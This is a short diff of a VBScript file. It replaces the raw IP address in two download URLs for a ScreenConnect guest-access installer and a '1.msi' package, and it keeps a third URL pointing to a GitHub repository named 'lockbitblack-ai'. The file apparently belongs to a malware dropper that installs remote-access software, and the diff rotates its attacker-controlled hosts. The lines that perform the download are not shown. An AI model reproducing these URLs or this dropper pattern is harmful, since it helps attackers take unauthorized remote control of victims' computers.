@@ -2,8 +2,8 @@
 Dim PACKAGE_URLS, TEMP_PATH, TEMP_DIR
 
 PACKAGE_URLS = Array( _
-    "http://194.59.30.213:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest", _
-    "http://194.59.30.213:8040/Bin/1.msi", _
+    "http://151.241.154.238:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest", _
+    "http://151.241.154.238:8040/Bin/1.msi", _
     "https://raw.githubusercontent.com/lockbitblack-ai/screen/refs/heads/main/1.msi" _
 )
 
